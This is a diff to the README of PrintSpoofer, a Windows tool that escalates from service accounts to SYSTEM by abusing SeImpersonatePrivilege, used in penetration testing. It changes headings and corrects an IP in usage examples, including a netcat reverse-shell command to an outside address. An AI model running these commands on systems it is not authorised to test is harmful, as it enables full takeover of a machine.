@@ -6,7 +6,7 @@ From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Wind
   <img src="demo.gif">
 </p>
 
-## Prerequisites
+## Usage
 
 You can check the help message using the `-h` option.
 
@@ -30,10 +30,10 @@ Examples:
   - Spawn a SYSTEM command prompt on the currently active desktop
       PrintSpoofer.exe -d -c cmd.exe
   - Get a SYSTEM reverse shell
-      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.1337 1337 -e cmd"
+      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
 ```
 
-### Spawn a SYSTEM command prompt in the current console
+### Example 1: Spawn a SYSTEM command prompt in the current console
 
 :information_source: This command requires an __interactive__ shell.
 
@@ -51,7 +51,7 @@ C:\WINDOWS\system32>whoami
 nt authority\system
 ```
 
-### Get a SYSTEM reverse shell
+### Example 2: Get a SYSTEM reverse shell
 
 :information_source: This command can be used to create a new process and immediately exit.
 
@@ -73,7 +73,7 @@ C:\WINDOWS\system32>whoami
 nt authority\system
 ```
 
-### Spawn a SYSTEM PowerShell prompt on the active desktop
+### Example 3: Spawn a SYSTEM PowerShell prompt on the active desktop
 
 :information_source: For testing purposes, you can spawn a SYSTEM shell on your desktop. :)
 
